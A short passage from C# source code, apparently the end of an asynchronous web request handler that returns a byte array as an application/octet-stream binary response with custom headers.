        await req.ReturnBinaryResponse(bytes, "application/octet-stream", headers: headers);
    }
}





